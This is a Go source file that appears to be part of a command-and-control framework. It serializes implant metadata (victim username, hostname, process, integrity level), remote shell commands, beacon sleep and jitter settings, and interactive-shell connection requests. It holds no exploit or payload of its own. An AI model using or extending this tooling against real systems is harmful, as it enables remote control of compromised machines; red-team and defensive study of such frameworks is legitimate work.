package protocol

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"

	"c2/models"
)

// EncodeImplantMetadata serializes metadata for RSA encryption.
// Format: id(uint32 LE) | session_key(32 bytes) | [presence(0x01)+field]...
// All optional fields are always written as present (0x01). The decoder handles
// both present (0x01) and absent (0x00) for interoperability with third-party beacons.
// Empty strings are encoded as absent (0x00).
func EncodeImplantMetadata(m *models.ImplantMetadata) []byte {
	var buf bytes.Buffer
	binary.Write(&buf, binary.LittleEndian, m.ID)
	buf.Write(m.SessionKey)
	writeOptionalUint32(&buf, m.Sleep)
	writeOptionalUint32(&buf, m.Jitter)
	writeOptionalString(&buf, m.Username)
	writeOptionalString(&buf, m.Hostname)
	writeOptionalString(&buf, m.ProcessName)
	writeOptionalUint32(&buf, m.ProcessID)
	writeOptionalUint8(&buf, m.Arch)
	writeOptionalUint8(&buf, m.Platform)
	writeOptionalUint8(&buf, m.Integrity)
	return buf.Bytes()
}

// DecodeImplantMetadata deserializes the output of EncodeImplantMetadata.
func DecodeImplantMetadata(b []byte) (*models.ImplantMetadata, error) {
	r := bytes.NewReader(b)
	m := &models.ImplantMetadata{}

	if err := binary.Read(r, binary.LittleEndian, &m.ID); err != nil {
		return nil, err
	}
	m.SessionKey = make([]byte, 32)
	if _, err := io.ReadFull(r, m.SessionKey); err != nil {
		return nil, err
	}

	m.Sleep = readOptionalUint32(r)
	m.Jitter = readOptionalUint32(r)
	m.Username = readOptionalString(r)
	m.Hostname = readOptionalString(r)
	m.ProcessName = readOptionalString(r)
	m.ProcessID = readOptionalUint32(r)
	readOptionalUint8(r, &m.Arch)
	readOptionalUint8(r, &m.Platform)
	readOptionalUint8(r, &m.Integrity)
	return m, nil
}

func writeOptionalUint32(buf *bytes.Buffer, v uint32) {
	buf.WriteByte(0x01)
	binary.Write(buf, binary.LittleEndian, v)
}

func writeOptionalUint8(buf *bytes.Buffer, v uint8) {
	buf.WriteByte(0x01)
	buf.WriteByte(v)
}

func writeOptionalString(buf *bytes.Buffer, s string) {
	if s == "" {
		buf.WriteByte(0x00)
		return
	}
	buf.WriteByte(0x01)
	binary.Write(buf, binary.LittleEndian, uint32(len(s)))
	buf.WriteString(s)
}

func readOptionalUint32(r *bytes.Reader) uint32 {
	if present, _ := r.ReadByte(); present != 0x01 {
		return 0
	}
	var v uint32
	binary.Read(r, binary.LittleEndian, &v)
	return v
}

func readOptionalUint8(r *bytes.Reader, out *uint8) {
	if present, _ := r.ReadByte(); present != 0x01 {
		return
	}
	*out, _ = r.ReadByte()
}

const maxStringLen = 4096

func readOptionalString(r *bytes.Reader) string {
	if present, _ := r.ReadByte(); present != 0x01 {
		return ""
	}
	var length uint32
	binary.Read(r, binary.LittleEndian, &length)
	if length > maxStringLen || int(length) > r.Len() {
		return ""
	}
	buf := make([]byte, length)
	io.ReadFull(r, buf)
	return string(buf)
}

// EncodeRunReq serializes a shell command as RUN-REQ:
// uint32 LE length-prefix + string bytes.
// The same format is used in RUN-REP (beacon reply).
func EncodeRunReq(cmd string) []byte {
	b := make([]byte, 4+len(cmd))
	binary.LittleEndian.PutUint32(b[:4], uint32(len(cmd)))
	copy(b[4:], cmd)
	return b
}

// DecodeRunRep deserializes a RUN-REP: uint32 LE length-prefix + string bytes.
func DecodeRunRep(b []byte) (string, error) {
	if len(b) < 4 {
		return "", fmt.Errorf("DecodeRunRep: need at least 4 bytes, got %d", len(b))
	}
	n := binary.LittleEndian.Uint32(b[:4])
	if uint32(len(b)) < 4+n {
		return "", fmt.Errorf("DecodeRunRep: truncated: need %d bytes, have %d", 4+n, len(b))
	}
	return string(b[4 : 4+n]), nil
}

// EncodeSetSleepReq serializes a SET-SLEEP request:
// uint32 LE interval (seconds) + uint32 LE jitter (percent).
func EncodeSetSleepReq(interval, jitter uint32) []byte {
	b := make([]byte, 8)
	binary.LittleEndian.PutUint32(b[:4], interval)
	binary.LittleEndian.PutUint32(b[4:], jitter)
	return b
}

// EncodeInteractiveReq serializes an INTERACTIVE-REQ payload:
// uint32 LE host_len + host bytes + uint16 LE port.
func EncodeInteractiveReq(host string, port uint16) []byte {
	b := make([]byte, 4+len(host)+2)
	binary.LittleEndian.PutUint32(b[:4], uint32(len(host)))
	copy(b[4:], host)
	binary.LittleEndian.PutUint16(b[4+len(host):], port)
	return b
}

// DecodeInteractiveReq deserializes an INTERACTIVE-REQ payload.
func DecodeInteractiveReq(b []byte) (string, uint16, error) {
	if len(b) < 6 {
		return "", 0, fmt.Errorf("DecodeInteractiveReq: need at least 6 bytes, got %d", len(b))
	}
	hostLen := binary.LittleEndian.Uint32(b[:4])
	if uint32(len(b)) < 4+hostLen+2 {
		return "", 0, fmt.Errorf("DecodeInteractiveReq: truncated: need %d bytes, have %d", 4+hostLen+2, len(b))
	}
	host := string(b[4 : 4+hostLen])
	port := binary.LittleEndian.Uint16(b[4+hostLen:])
	return host, port, nil
}

// EncodeShellInput serializes shell stdin bytes: uint32 LE length + raw bytes.
func EncodeShellInput(input []byte) []byte {
	b := make([]byte, 4+len(input))
	binary.LittleEndian.PutUint32(b[:4], uint32(len(input)))
	copy(b[4:], input)
	return b
}

// DecodeShellInput deserializes shell stdin bytes.
func DecodeShellInput(b []byte) ([]byte, error) {
	if len(b) < 4 {
		return nil, fmt.Errorf("DecodeShellInput: need at least 4 bytes, got %d", len(b))
	}
	n := binary.LittleEndian.Uint32(b[:4])
	if uint32(len(b)) < 4+n {
		return nil, fmt.Errorf("DecodeShellInput: truncated: need %d bytes, have %d", 4+n, len(b))
	}
	return b[4 : 4+n], nil
}
